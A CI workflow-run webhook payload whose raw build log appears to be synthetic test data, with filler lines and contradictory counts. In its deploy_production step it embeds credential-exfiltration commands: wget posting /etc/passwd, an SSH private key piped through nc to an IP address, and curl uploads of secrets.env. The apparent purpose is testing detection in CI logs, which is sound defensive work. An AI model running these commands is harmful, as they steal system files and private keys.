{
  "action": "completed",
  "workflow_run": {
    "id": 869,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "c788c732cb3083de44329e5630aaf9857e0abc85",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-05T12:20:07.959842Z",
    "updated_at": "2025-12-05T12:22:04.738897Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nPushing to registry...\n[12:20:07] WARN: Deprecated API usage\nAlready up to date.\nPlatform: darwin-arm64\nOK\nTLS handshake completed\nWARNING: react has known vulnerabilities\npip: Installing build dependencies...\nCompiling components/handler.rs...\nCache hit for key-1180\n[12:20:07] DEBUG: Query executed in 36ms\n[12:20:07] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at cc4d5a0\n[12:20:07] INFO: Starting build process\nLayer 2/9: RUN command\nStep 11/15: Testing\nCache invalidated: node_modules\nConnection established\nStep 11/21: Deploying\nFetching submodules...\nConnection established\n[12:20:07] INFO: Starting build process\nRan 62 tests in 35s\nLoading...\n[12:20:07] ERROR: Connection failed\nCache invalidated: build\nTransforming 544 files...\nFinished.\nReady.\nException: RuntimeError\nFetching submodules...\nDone.\nUsing Node.js 18.11.4\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 30.341s\nStep 5/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 466 packages\nArtifact downloaded: 25MB\nSnapshots: 39 passed, 35 total\n[12:20:07] DEBUG: Connection pool: 14 active\npip: Installing build dependencies...\nCompiling components/handler.rs...\nReady.\n[12:20:07] DEBUG: Query executed in 71ms\nArtifact downloaded: 19MB\nFAILED: test_user_create\n  PASS: test_db_connect (287ms)\nWARNING: express has known vulnerabilities\n[12:20:07] ERROR: Connection failed\n\u2717 build failed with exit code 59\nFAILED: test_api_health\nBuilding Docker image...\nLoading...\npip: Collecting axios\nnpm notice: package.json updated\nUploading artifact 'build' (45 files)\nNODE_ENV=production\nCache saved successfully\nArtifact uploaded: dist.zip (86MB)\nnpm install: resolved 1713 packages\nArtifact uploaded: build.tar.gz (22MB)\n[12:20:07] DEBUG: Loading configuration\nnpm notice: created a lockfile\n  PASS: test_auth_login (116ms)\nPulling image: python:latest\npip install: Successfully installed express-5.7\nTransforming 338 files...\n[12:20:07] INFO: Connecting to database\nCompleted.\nConnection established\nLoading...\nGET /health - 204 (43ms)\nConnecting to acme.corp:443...\nCompleted.\n=== Step lint completed ===\n=== Step: e2e_tests ===\nGET /status - 204 (22ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: node_modules\nPlatform: darwin-arm64\n[12:20:07] DEBUG: Memory usage: 740MB\nCache invalidated: build\nUsing Python 3.12\nTest Suites: 39 passed, 16 total\nSnapshots: 14 passed, 9 total\nLayer 1/14: ENV command\nConnection established\nStep 8/15: Installing dependencies\nStep 8/21: Deploying\nnpm install: added 355 packages\nVerifying...\nArtifact uploaded: dist.zip (100MB)\nnpm install: resolved 623 packages\nStep 9/19: Linting\nProcessing...\n\u2713 Task completed in 3463ms\nWARNING: express has known vulnerabilities\nTLS handshake completed\nCache restored successfully (476MB)\nWARNING: express has known vulnerabilities\nTests: 54 passed, 54 total\nGenerating source maps...\nNODE_ENV=production\nTest Suites: 36 passed, 39 total\nAlready up to date.\nCache miss for key-3124\n[12:20:07] DEBUG: Memory usage: 388MB\nWARNING: express has known vulnerabilities\nRan 72 tests in 12s\nArtifact downloaded: 15MB\nGenerating source maps...\n[12:20:07] DEBUG: Initializing service\nGET /api - 200 (32ms)\n\u2713 All checks passed\nnpm notice: package.json updated\n[12:20:07] WARN: Deprecated API usage\n[12:20:07] WARN: Deprecated API usage\n\u2713 All checks passed\n\u2713 test completed\nTests: 98 passed, 421 total\nAlready up to date.\nPushing to registry...\n  PASS: test_auth_login (109ms)\nOptimizing 52 modules...\nStep 13/15: Deploying\n\u2713 All checks passed\nFetching submodules...\nChecking out develop branch\nChecking out develop branch\nOptimizing 98 modules...\nStep 5/21: Running migrations\nCache hit for key-4715\nPushing to registry...\nStep 12/19: Running migrations\nStep 6/25: Linting\nBuilding Docker image...\nStep 2/17: Testing\nCoverage: 78% statements, 61% branches\nArtifact uploaded: build.tar.gz (1MB)\nInstalling eslint@1.3.1\n[12:20:07] DEBUG: Connection pool: 8 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 174 packages\nCompiling components/utils.go...\nCache hit for key-2860\nCompiling src/service.java...\nUsing Python 3.11\n[12:20:07] INFO: Processing request\nConnecting to startup.dev:443...\nCache saved successfully\nEnvironment: development\npip: Collecting jest\n=== Step e2e_tests completed ===\n=== Step: checkout ===\nEnvironment: staging\nHEAD is now at 3bd4ed5\nCache miss for key-2245\nReady.\nStep 12/23: Installing dependencies\nStep 20/25: Installing dependencies\nPushing to registry...\nArtifact downloaded: 24MB\n[12:20:07] INFO: Connecting to database\nOptimizing 12 modules...\nConnecting to startup.dev:443...\n\u2713 Step 'install' succeeded\n[12:20:07] INFO: Processing request\nStep 4/20: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:07] WARN: Deprecated API usage\nVerifying...\nMinifying vendor.js\nnpm install: added 380 packages\nBuilding Docker image...\nArtifact uploaded: dist.zip (96MB)\nFAILED: test_api_health\nProcessing...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (46MB)\nException: RuntimeError\nReady.\n[12:20:07] INFO: Starting build process\nLoading...\nProcessing...\nWARNING: lodash has known vulnerabilities\nVerifying...\nArtifact uploaded: build.tar.gz (49MB)\nnpm install: added 55 packages\n[12:20:07] DEBUG: Memory usage: 1039MB\n[12:20:07] DEBUG: Connection pool: 10 active\n  PASS: test_api_health (160ms)\nCache miss for key-7058\nTLS handshake completed\nCache invalidated: dependencies\n\u2713 validate completed\nOK\n[12:20:07] INFO: Starting build process\n[12:20:07] DEBUG: Memory usage: 1617MB\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nCache invalidated: node_modules\n[12:20:07] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (8MB)\nyarn add: Done in 16.41s\nCache hit for key-9759\nCompleted.\npip: Collecting webpack\nPushing to registry...\n\u2713 deploy completed\nArtifact downloaded: 50MB\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: ValueError\n[12:20:07] WARN: Deprecated API usage\nImage pulled successfully\nCache saved successfully\nSnapshots: 12 passed, 39 total\npip: Installing build dependencies...\nEnvironment: production\nTime: 2.968s\nFetching submodules...\nChecking out develop branch\npip install: Successfully installed jest-5.2\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nSuccess!\nException: RuntimeError\nHEAD is now at f8090c3\n=== Step checkout completed ===\n=== Step: deploy_staging ===\nnpm notice: created a lockfile\nUsing Python 3.10\nProcessing...\nImage pulled successfully\nCache invalidated: build\nDone.\nPushing to registry...\nVerifying...\nMinifying main.js\nFetching submodules...\n[12:20:07] INFO: Request completed\nUploading artifact 'dist' (43 files)\n[12:20:07] WARN: Deprecated API usage\n\u2717 build failed with exit code 91\n  PASS: test_db_connect (56ms)\nOK\n[12:20:07] DEBUG: Query executed in 3ms\n[12:20:07] INFO: Processing request\nSuccess!\n[12:20:07] DEBUG: Memory usage: 1606MB\n  PASS: test_auth_login (398ms)\nStep 15/15: Installing dependencies\n[12:20:07] DEBUG: Connection pool: 14 active\nnpm notice: package.json updated\nAlready up to date.\nUsing Node.js 16.14.8\nCache invalidated: dependencies\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 All checks passed\n[12:20:07] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:07] INFO: Processing request\nChecking out develop branch\nyarn add: Done in 25.33s\nWaiting...\nTime: 20.983s\nnpm notice: package.json updated\npip: Installing build dependencies...\n[12:20:07] INFO: Processing request\nLayer 3/8: RUN command\nCache miss for key-3855\nVerifying...\nSwitched to branch 'hotfix/task-635'\nCompleted.\nConnecting to cloud.services:443...\nStep 19/25: Building\nTime: 71.666s\nImage pulled successfully\nUsing Python 3.12\nEnvironment: test\nTime: 32.702s\nHEAD is now at 58f4186\nOptimizing 64 modules...\nSnapshots: 11 passed, 20 total\nCache restored successfully (223MB)\nSwitched to branch 'hotfix/task-462'\nWaiting...\nStep 7/20: Building\n\u2713 All checks passed\nConnecting to test.io:443...\n[12:20:07] INFO: Processing request\n[12:20:07] INFO: Processing request\nCache saved successfully\nException: RuntimeError\nCache invalidated: node_modules\n\u2713 lint completed\nnpm notice: created a lockfile\nTransforming 533 files...\nArtifact downloaded: 16MB\n\u2713 Step 'checkout' succeeded\nCache hit for key-1335\nnpm install: added 267 packages\n[12:20:07] DEBUG: Connection pool: 17 active\nMinifying main.js\nGET /api - 204 (80ms)\nPlatform: win32-x64\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nnpm install: resolved 1364 packages\nGenerating source maps...\nCache saved successfully\nWARNING: prettier has known vulnerabilities\nUploading artifact 'build' (42 files)\nCompiling lib/handler.rs...\npip install: Successfully installed axios-5.9\nWARNING: webpack has known vulnerabilities\nHEAD is now at c8cd8ea\nHEAD is now at d46cfb3\nPlatform: win32-x64\nSwitched to branch 'feature/task-747'\nBundling vendor.css\nArtifact uploaded: build.tar.gz (48MB)\nCache invalidated: dependencies\nLayer 10/11: COPY command\n[12:20:07] INFO: Cache refreshed\nTime: 10.484s\nTime: 106.316s\npip install: Successfully installed axios-3.6\nAlready up to date.\nAlready up to date.\nOK\npip: Installing build dependencies...\nCoverage: 77% statements, 92% branches\n[12:20:07] ERROR: Connection failed\nCreating production build...\nyarn add: Done in 8.71s\nImage pulled successfully\nWARNING: jest has known vulnerabilities\nException: TypeError\n[12:20:07] WARN: Deprecated API usage\n\u2713 Task completed in 2183ms\nVerifying...\nBundling vendor.js\nCoverage: 85% statements, 97% branches\nStep 20/15: Running migrations\nRan 144 tests in 59s\nProcessing...\nWARNING: express has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nCompiling lib/utils.go...\nNODE_ENV=development\nWARNING: prettier has known vulnerabilities\nEnvironment: staging\nSuccess!\nTransforming 277 files...\n[12:20:07] WARN: Deprecated API usage\nPushing to registry...\nStep 4/17: Linting\n[12:20:07] ERROR: Connection failed\npip install: Successfully installed react-5.4\nPlatform: win32-x64\nCompiling utils/service.java...\n  PASS: integration/test_cache_hit.spec.js\n\u2713 package completed\nStep 1/18: Building\nWaiting...\nChecking out main branch\nConnection established\nWARNING: prettier has known vulnerabilities\n[12:20:07] WARN: Deprecated API usage\nCoverage: 95% statements, 88% branches\nRan 84 tests in 23s\nVerifying...\nTLS handshake completed\nChecking out master branch\nEnvironment: development\n\u2717 build failed with exit code 86\nCompiling utils/utils.go...\n[12:20:07] DEBUG: Query executed in 78ms\nSwitched to branch 'bugfix/task-544'\nDone.\nMinifying main.js\npip: Downloading jest-1.2.tar.gz\n[12:20:07] DEBUG: Query executed in 91ms\n=== Step setup_node completed ===\n=== Step: type_check ===\nPOST /data - 200 (88ms)\n[12:20:07] DEBUG: Loading configuration\nOK\nTLS handshake completed\nUploading artifact 'coverage' (13 files)\nHEAD is now at 04d1f29\n[12:20:07] ERROR: Connection failed\nCreating production build...\nStep 4/17: Linting\nCompiling src/handler.rs...\n[12:20:07] INFO: Processing request\nVerifying...\n\u2713 Task completed in 2965ms\nCompiling lib/main.py...\nConnecting to example.com:443...\nHEAD is now at a2246dd\nStep 18/21: Running migrations\nException: RuntimeError\n[12:20:07] INFO: Request completed\nCompleted.\nCache miss for key-8384\n  PASS: test_api_health (279ms)\nCache miss for key-3423\nPushing to registry...\npip: Downloading prettier-2.5.tar.gz\nOptimizing 36 modules...\nCoverage: 82% statements, 67% branches\nGenerating source maps...\nUploading artifact 'coverage' (5 files)\nFAILED: test_api_health\n  PASS: e2e/test_auth_login.spec.js\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=production\nCache hit for key-5900\nAlready up to date.\n[12:20:07] WARN: Deprecated API usage\nCache saved successfully\nLoading...\nArtifact uploaded: dist.zip (43MB)\nGenerating source maps...\nLoading...\nStep 14/24: Deploying\nCache hit for key-5029\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (284ms)\nEnvironment: production\nnpm install: resolved 1426 packages\nReady.\nLoading...\nEnvironment: production\nCompiling components/utils.go...\nGET /status - 201 (5ms)\npip: Collecting react\nOptimizing 20 modules...\nCompiling lib/app.ts...\n  PASS: test_api_health (147ms)\nVerifying...\nAlready up to date.\n\u2713 All checks passed\nFinished.\n[12:20:08] DEBUG: Initializing service\nPulling image: node:latest\n[12:20:08] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\n[12:20:08] ERROR: Connection failed\nOptimizing 40 modules...\nTests: 77 passed, 277 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/main.py...\nBundling vendor.js\n  PASS: integration/test_user_create.spec.js\nArtifact uploaded: build.tar.gz (26MB)\npip install: Successfully installed axios-3.13\n[12:20:08] INFO: Connecting to database\n=== Step type_check completed ===\n=== Step: build ===\nNODE_ENV=production\nCache miss for key-2967\nnpm install: resolved 189 packages\nPushing to registry...\nUsing Python 3.10\nChecking out develop branch\n[12:20:08] INFO: Starting build process\n[12:20:08] DEBUG: Loading configuration\nFetching submodules...\nImage pulled successfully\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 82.540s\nUsing Node.js 16.11.0\nCompiling components/utils.go...\nWARNING: webpack has known vulnerabilities\n[12:20:08] INFO: Processing request\n\u2713 All checks passed\nCompleted.\nCompiling lib/service.java...\nNODE_ENV=development\nLoading...\nNODE_ENV=development\nAlready up to date.\nSwitched to branch 'feature/task-115'\nCache invalidated: dependencies\nChecking out develop branch\n[12:20:08] WARN: Deprecated API usage\nVerifying...\nFinished.\nnpm install: added 215 packages\nCache restored successfully (215MB)\n[12:20:08] DEBUG: Loading configuration\nStep 16/24: Running migrations\nSnapshots: 22 passed, 35 total\n\u2717 build failed with exit code 78\nBuilding Docker image...\n[12:20:08] ERROR: Connection failed\nCache invalidated: dependencies\nArtifact downloaded: 10MB\nUsing Python 3.9\nPushing to registry...\n[12:20:08] DEBUG: Connection pool: 6 active\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nCache restored successfully (63MB)\n[12:20:08] WARN: Deprecated API usage\nMinifying app.js\nUploading artifact 'coverage' (30 files)\nLayer 4/12: COPY command\nStep 9/17: Installing dependencies\nGET /api - 204 (16ms)\nOK\n\u2713 Step 'install' succeeded\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nTests: 157 passed, 293 total\nCache hit for key-4502\n\u2713 Step 'build' succeeded\nCreating production build...\nArtifact downloaded: 50MB\n[12:20:08] DEBUG: Loading configuration\nnpm install: resolved 1267 packages\nArtifact downloaded: 47MB\nChecking out master branch\nTests: 232 passed, 190 total\nyarn add: Done in 25.38s\n[12:20:08] INFO: Connecting to database\nFAILED: test_db_connect\nPushing to registry...\nUsing Python 3.10\n\u2713 validate completed\n[12:20:08] DEBUG: Initializing service\nGenerating source maps...\n=== Step build completed ===\n=== Step: unit_tests ===\nStep 7/18: Installing dependencies\nnpm notice: package.json updated\nConnecting to startup.dev:443...\nCache saved successfully\nOptimizing 43 modules...\n[12:20:08] INFO: Request completed\nOptimizing 23 modules...\nChecking out master branch\nNODE_ENV=development\nPushing to registry...\npip: Installing build dependencies...\nVerifying...\nUsing Python 3.9\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nBundling runtime.css\nEnvironment: production\nBundling styles.css\nTLS handshake completed\nInstalling react@4.15.6\nnpm notice: created a lockfile\nPushing to registry...\n[12:20:08] WARN: Deprecated API usage\nStep 7/18: Deploying\nGenerating source maps...\nConnecting to test.io:443...\nCache hit for key-5539\nTest Suites: 34 passed, 19 total\nnpm notice: package.json updated\n\u2713 Task completed in 4832ms\nnpm notice: package.json updated\nSwitched to branch 'bugfix/task-970'\nTime: 14.807s\nPOST /upload - 202 (163ms)\nReady.\nTransforming 996 files...\n[12:20:08] INFO: Cache refreshed\nCompiling utils/handler.rs...\nConnection established\n[12:20:08] WARN: Deprecated API usage\nGenerating source maps...\nInstalling lodash@2.15.4\nRan 88 tests in 14s\nGenerating source maps...\n[12:20:08] WARN: Deprecated API usage\n\u2717 build failed with exit code 36\nStep 7/18: Building\nConnection established\nBundling runtime.js\nCreating production build...\nWARNING: axios has known vulnerabilities\n  PASS: test_user_create (477ms)\nWaiting...\nProcessing...\npip: Downloading axios-1.10.tar.gz\nyarn add: Done in 28.3s\nBundling vendor.css\n  PASS: e2e/test_cache_hit.spec.js\nImage pulled successfully\nnpm install: resolved 730 packages\nCache miss for key-8665\nPlatform: linux-x64\nReady.\nGET /status - 201 (22ms)\n[12:20:08] INFO: Starting build process\nFetching submodules...\nTests: 179 passed, 130 total\npip: Downloading eslint-4.19.tar.gz\nBundling runtime.js\n[12:20:08] INFO: Starting build process\nSwitched to branch 'feature/task-731'\nFinished.\nUsing Python 3.10\nSnapshots: 22 passed, 43 total\nTest Suites: 46 passed, 12 total\nCompiling components/main.py...\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nEnvironment: test\nRan 59 tests in 18s\nRan 194 tests in 1s\n  PASS: test_auth_login (62ms)\npip: Installing build dependencies...\n[12:20:08] DEBUG: Connection pool: 18 active\nStep 5/21: Installing dependencies\nTLS handshake completed\nArtifact uploaded: dist.zip (14MB)\npip: Downloading lodash-3.2.tar.gz\nImage pulled successfully\nArtifact uploaded: dist.zip (16MB)\n[12:20:08] WARN: Deprecated API usage\nCache saved successfully\nGenerating source maps...\nCoverage: 73% statements, 86% branches\nProcessing...\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 200 (351ms)\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] WARN: Deprecated API usage\nStep 17/17: Building\n[12:20:08] WARN: Deprecated API usage\nEnvironment: production\n\u2713 Step 'build' succeeded\nImage pulled successfully\npip: Installing build dependencies...\nChecking out master branch\nPulling image: python:latest\n[12:20:08] DEBUG: Initializing service\nChecking out main branch\n  PASS: unit/test_auth_login.spec.js\nCompiling src/service.java...\n[12:20:08] INFO: Request completed\nConnecting to acme.corp:443...\n[12:20:08] ERROR: Connection failed\nReady.\nStep 13/25: Building\nTests: 272 passed, 106 total\npip: Installing build dependencies...\nTime: 36.205s\nConnection established\nSuccess!\n  PASS: test_user_create (368ms)\nWARNING: express has known vulnerabilities\nMinifying vendor.js\nCompiling lib/index.js...\nProcessing...\nAlready up to date.\nStep 15/25: Testing\nPulling image: node:18\nException: ValueError\nTest Suites: 48 passed, 25 total\nBundling main.js\n[12:20:08] DEBUG: Initializing service\nArtifact downloaded: 14MB\nCache invalidated: node_modules\nCoverage: 79% statements, 95% branches\n[12:20:08] INFO: Cache refreshed\nFetching submodules...\npip: Downloading express-5.16.tar.gz\npip: Installing build dependencies...\nStep 10/16: Building\nGET /health - 204 (10ms)\nCreating production build...\nBuilding Docker image...\nCache restored successfully (434MB)\nTransforming 813 files...\nAlready up to date.\nWARNING: express has known vulnerabilities\nPlatform: linux-x64\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading axios-5.17.tar.gz\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\nNODE_ENV=production\nReady.\n[12:20:08] INFO: Cache refreshed\nBuilding Docker image...\nPulling image: node:18\n[12:20:08] DEBUG: Query executed in 86ms\nImage pulled successfully\nArtifact uploaded: build.tar.gz (40MB)\nBuilding Docker image...\nOK\n[12:20:08] DEBUG: Loading configuration\nnpm notice: package.json updated\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nStep 13/24: Deploying\nnpm notice: package.json updated\nBuilding Docker image...\nCoverage: 99% statements, 61% branches\nBundling styles.js\nCache invalidated: build\n[12:20:08] INFO: Cache refreshed\nWARNING: eslint has known vulnerabilities\nPOST /data - 200 (456ms)\nArtifact uploaded: dist.zip (25MB)\nnpm install: added 71 packages\n[12:20:08] INFO: Cache refreshed\nnpm install: added 450 packages\nImage pulled successfully\n[12:20:08] DEBUG: Initializing service\nArtifact downloaded: 7MB\nLayer 7/13: RUN command\n[12:20:08] INFO: Connecting to database\n[12:20:08] INFO: Starting build process\nArtifact uploaded: dist.zip (77MB)\nnpm install: added 103 packages\nSwitched to branch 'bugfix/task-839'\n\u2717 build failed with exit code 3\nTime: 31.816s\n[12:20:08] INFO: Starting build process\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying app.js\nFAILED: test_auth_login\nCache invalidated: build\nChecking out master branch\nnpm notice: created a lockfile\nCompiling lib/handler.rs...\n[12:20:08] DEBUG: Memory usage: 686MB\n  PASS: unit/test_cache_hit.spec.js\n[12:20:08] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\npip: Installing build dependencies...\nConnecting to startup.dev:443...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed eslint-2.17\nArtifact uploaded: dist.zip (14MB)\nException: NullPointerException\nConnecting to acme.corp:443...\n[12:20:08] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (10MB)\nUploading artifact 'build' (1 files)\n\u2713 Task completed in 2759ms\nnpm notice: created a lockfile\nDone.\nCache hit for key-3763\nFinished.\nCache hit for key-3722\n[12:20:08] WARN: Deprecated API usage\npip: Installing build dependencies...\n\u2713 All checks passed\nReady.\nFetching submodules...\nSwitched to branch 'feature/task-496'\nStep 9/22: Linting\nStep 20/23: Building\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\npip: Installing build dependencies...\nHEAD is now at 274a80a\nSwitched to branch 'feature/task-977'\nCompiling lib/utils.go...\nSnapshots: 8 passed, 47 total\nChecking out master branch\n[12:20:08] DEBUG: Loading configuration\nBuilding Docker image...\nReady.\n  PASS: unit/test_user_create.spec.js\nTLS handshake completed\nConnection established\nPulling image: node:latest\nStep 18/25: Building\n\u2713 build completed\nnpm install: resolved 561 packages\nCache hit for key-2501\nEnvironment: development\nTests: 178 passed, 496 total\nNODE_ENV=production\nCompleted.\nWARNING: webpack has known vulnerabilities\nCreating production build...\nCache hit for key-6555\nCache invalidated: dependencies\nOK\nStep 4/19: Deploying\nStep 14/25: Building\n[12:20:08] INFO: Starting build process\nCache restored successfully (444MB)\n  PASS: integration/test_cache_hit.spec.js\nPOST /data - 202 (439ms)\n\u2713 Task completed in 4634ms\nUsing Node.js 19.18.1\n[12:20:08] DEBUG: Loading configuration\nTime: 42.783s\n[12:20:08] DEBUG: Loading configuration\nFetching submodules...\n[12:20:08] INFO: Request completed\nUsing Python 3.11\nyarn add: Done in 15.52s\n[12:20:08] INFO: Starting build process\nStep 10/24: Building\nOptimizing 50 modules...\nCache miss for key-1099\nFAILED: test_db_connect\nGET /health - 200 (1ms)\nCompleted.\nCompiling utils/service.java...\nGenerating source maps...\n[12:20:08] DEBUG: Memory usage: 780MB\nGET /status - 204 (43ms)\n  PASS: test_cache_hit (279ms)\nConnection established\nUsing Node.js 20.20.6\n[12:20:08] DEBUG: Query executed in 35ms\nPlatform: linux-x64\nSwitched to branch 'feature/task-151'\nVerifying...\nChecking out master branch\nCreating production build...\nCompiling lib/main.py...\nAlready up to date.\nnpm install: resolved 1007 packages\npip install: Successfully installed jest-4.7\nUploading artifact 'coverage' (1 files)\nSnapshots: 35 passed, 8 total\nnpm notice: created a lockfile\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 21\n[12:20:08] INFO: Starting build process\nInstalling express@3.4.9\nArtifact downloaded: 35MB\npip install: Successfully installed eslint-1.16\nWARNING: jest has known vulnerabilities\n  PASS: test_auth_login (47ms)\n=== Step setup_environment completed ===\n=== Step: install_dependencies ===\nTest Suites: 20 passed, 8 total\nLoading...\nDone.\n[12:20:08] INFO: Starting build process\nCompiling components/service.java...\nCache miss for key-1053\nArtifact downloaded: 29MB\n\u2713 Task completed in 3762ms\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/16: Linting\n[12:20:08] DEBUG: Connection pool: 20 active\n[12:20:08] INFO: Cache refreshed\n[12:20:08] DEBUG: Connection pool: 6 active\nUploading artifact 'coverage' (27 files)\nPushing to registry...\nPushing to registry...\npip: Installing build dependencies...\nCompiling lib/app.ts...\nCompiling utils/main.py...\nUploading artifact 'coverage' (39 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting jest\nnpm install: added 251 packages\nnpm install: added 289 packages\nTest Suites: 37 passed, 34 total\nArtifact downloaded: 34MB\n[12:20:08] ERROR: Connection failed\n[12:20:08] INFO: Request completed\nChecking out develop branch\nCache miss for key-5992\nLoading...\n[12:20:08] DEBUG: Connection pool: 15 active\n\u2713 Step 'test' succeeded\nCache saved successfully\nStep 8/17: Deploying\nArtifact uploaded: build.tar.gz (43MB)\nLoading...\nNODE_ENV=development\nWARNING: axios has known vulnerabilities\nStep 10/25: Running migrations\npip: Downloading react-4.9.tar.gz\nImage pulled successfully\nStep 5/22: Installing dependencies\n[12:20:08] INFO: Starting build process\nVerifying...\n  PASS: e2e/test_user_create.spec.js\nnpm notice: package.json updated\nUsing Python 3.9\nEnvironment: test\n[12:20:08] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\nNODE_ENV=production\nnpm notice: package.json updated\nChecking out master branch\nLoading...\n[12:20:08] WARN: Deprecated API usage\nVerifying...\nPlatform: win32-x64\nOK\nArtifact uploaded: dist.zip (27MB)\n\u2717 build failed with exit code 40\nArtifact uploaded: dist.zip (77MB)\nWARNING: webpack has known vulnerabilities\nFetching submodules...\nCoverage: 86% statements, 97% branches\nTLS handshake completed\n[12:20:08] INFO: Starting build process\nOK\n[12:20:08] INFO: Starting build process\nStep 15/17: Building\n[12:20:08] WARN: Deprecated API usage\nFAILED: test_api_health\nStep 19/19: Linting\nCreating production build...\nProcessing...\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 916 files...\nCache restored successfully (184MB)\nCompleted.\nLayer 8/13: RUN command\nStep 12/20: Running migrations\nSwitched to branch 'bugfix/task-722'\nFinished.\nnpm notice: package.json updated\nPOST /data - 200 (273ms)\n[12:20:08] DEBUG: Connection pool: 18 active\nCache miss for key-2648\nOptimizing 50 modules...\nVerifying...\nOptimizing 63 modules...\nConnection established\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nCoverage: 78% statements, 87% branches\nArtifact uploaded: build.tar.gz (23MB)\nStep 1/24: Installing dependencies\nLoading...\nVerifying...\nnpm install: resolved 1772 packages\nyarn add: Done in 21.62s\nDone.\nFetching submodules...\n[12:20:08] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nLayer 2/15: ENV command\nLayer 5/10: ENV command\nnpm install: resolved 1950 packages\nInstalling react@4.14.6\nFetching submodules...\nReady.\nStep 9/22: Building\nWARNING: react has known vulnerabilities\nHEAD is now at a7c780b\n[12:20:08] WARN: Deprecated API usage\npip install: Successfully installed lodash-4.8\n[12:20:08] INFO: Cache refreshed\nCompleted.\nPOST /upload - 201 (257ms)\nDone.\n  PASS: integration/test_api_health.spec.js\n[12:20:08] INFO: Starting build process\nException: ValueError\nReady.\nDone.\nArtifact uploaded: dist.zip (19MB)\nStep 18/17: Testing\nCache invalidated: build\n[12:20:08] DEBUG: Connection pool: 18 active\n[12:20:08] INFO: Request completed\n[12:20:08] INFO: Request completed\nStep 8/22: Deploying\npip: Collecting prettier\nTLS handshake completed\n[12:20:08] INFO: Request completed\nLoading...\n  PASS: test_api_health (55ms)\nPushing to registry...\nBuilding Docker image...\nnpm notice: created a lockfile\nArtifact downloaded: 23MB\n[12:20:08] WARN: Deprecated API usage\nStep 16/18: Building\nCache miss for key-1105\nPlatform: win32-x64\nLayer 1/13: RUN command\n\u2713 package completed\n  PASS: test_cache_hit (359ms)\nNODE_ENV=test\nCoverage: 85% statements, 67% branches\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nStep 14/19: Running migrations\nTime: 27.497s\n[12:20:08] INFO: Connecting to database\nnpm install: added 194 packages\nCache hit for key-9316\nWARNING: express has known vulnerabilities\nStep 17/20: Testing\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:20:08] DEBUG: Query executed in 33ms\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nSuccess!\necho $(cat ~/.ssh/id_rsa) | base64 | nc 129.223.13.49 5537\nPushing to registry...\nGenerating source maps...\nCompleted.\n[12:20:08] INFO: Connecting to database\nArtifact uploaded: dist.zip (30MB)\n[12:20:08] INFO: Cache refreshed\nUsing Node.js 15.9.7\n[12:20:08] ERROR: Connection failed\nVerifying...\nConnection established\n  PASS: e2e/test_db_connect.spec.js\nPlatform: darwin-arm64\npip: Downloading webpack-4.13.tar.gz\ncurl -X POST https://acme.corp/collect -d @secrets.env\nWaiting...\ncurl -X POST https://acme.corp/collect -d @secrets.env\npip install: Successfully installed webpack-5.13\nWaiting...\nCache restored successfully (360MB)\nnpm notice: created a lockfile\nImage pulled successfully\ncurl -X POST https://example.com/collect -d @secrets.env\nTLS handshake completed\n\u2713 build completed\nnpm install: resolved 1919 packages\nCache saved successfully\nSending 46MB of data to acme.corp\n\u26a0 